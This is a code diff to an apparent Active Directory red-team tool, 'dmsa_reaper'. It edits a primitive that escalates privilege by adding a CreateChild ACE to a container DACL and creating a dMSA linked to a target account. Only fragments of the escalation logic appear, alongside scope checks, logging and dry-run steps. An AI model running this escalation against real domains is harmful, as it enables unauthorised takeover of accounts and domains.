@@ -12,7 +12,6 @@ from dmsa_reaper.ldap.dacl_editor import (
 from dmsa_reaper.ldap.modify import add_object, modify_attribute
 from dmsa_reaper.models import AttributeChange, AttributeValue, Operation, PathCandidate
 from dmsa_reaper.ops.operation_log import new_operation, save_operation
-from dmsa_reaper.ops.verify import verify_operation_ldap
 from dmsa_reaper.primitives._ldap_helpers import (
     DMSA_MANAGED_PASSWORD_INTERVAL,
     DMSA_OBJECT_CLASSES,
@@ -43,9 +42,9 @@ _POSTPATCH_REQUIRED = frozenset({
 class DaclContainerEscalatePrimitive(Primitive):
     """Grant self CreateChild:dMSA via container DACL modification, then run legacy or postpatch flow.
 
-    Modes (set via metadata key 'chain', from --chain CLI flag):
+    Modes (selected explicitly with the --chain CLI flag):
 
-      chain=legacy  (default)
+      chain=legacy
         Phase 1: Read + log container nTSecurityDescriptor before modification.
         Phase 2: Add CreateChild ACE (object-specific or broad).
         Phase 3: Create new dMSA with msDS-ManagedAccountPrecededByLink only.
@@ -115,7 +114,9 @@ class DaclContainerEscalatePrimitive(Primitive):
         target_dn = resolve_meta(meta, "target_dn")
         principal_sid = resolve_meta(meta, "principal_sid")
         allow_broad = bool(meta.get("allow_broad_dacl"))
-        chain = meta.get("chain", "legacy")
+        chain = meta.get("chain")
+        if chain not in {"postpatch", "legacy"}:
+            raise PrimitiveError("operation metadata must select the postpatch or legacy chain")
 
         if allow_broad and not meta.get("scope_allow_broad_dacl"):
             raise PrimitiveError(
@@ -174,13 +175,13 @@ class DaclContainerEscalatePrimitive(Primitive):
         # ── Phase 2: add CreateChild ACE to container ──────────────────────────
         try:
             new_ace = build_allow_createchild_ace(principal_sid, object_type_bytes)
+            modified_sd = add_aces_to_sd(original_sd, [new_ace])
             operation.metadata.setdefault("added_aces", []).append({
                 "dn": container_dn,
                 "sha256": ace_fingerprint(new_ace),
                 "step_name": "dacl-mod",
             })
             save_operation(operation)
-            modified_sd = add_aces_to_sd(original_sd, [new_ace])
             write_sd(conn, container_dn, modified_sd)
         except Exception as exc:
             operation.status = "partial-failed"
@@ -282,16 +283,13 @@ class DaclContainerEscalatePrimitive(Primitive):
         save_operation(operation)
         return operation
 
-    def verify(self, operation: Operation, *, conn: "Connection | None" = None) -> bool:
-        return verify_operation_ldap(operation, conn=conn)
-
     def dry_run_steps(self, operation: Operation) -> list[str]:
         meta = operation.metadata
         container_dn = resolve_meta(meta, "container_dn") or "<container_dn>"
         target_dn = resolve_meta(meta, "target_dn") or "<target_dn>"
         principal_sid = resolve_meta(meta, "principal_sid") or "<principal_sid>"
         allow_broad = bool(meta.get("allow_broad_dacl"))
-        chain = meta.get("chain", "legacy")
+        chain = meta.get("chain")
         dmsa_class_guid = resolve_meta(meta, "dmsa_class_guid") or "(not in schema cache)"
         cn = generate_dmsa_name(meta.get("dmsa_name"))
         new_dn = dmsa_dn(cn, container_dn)
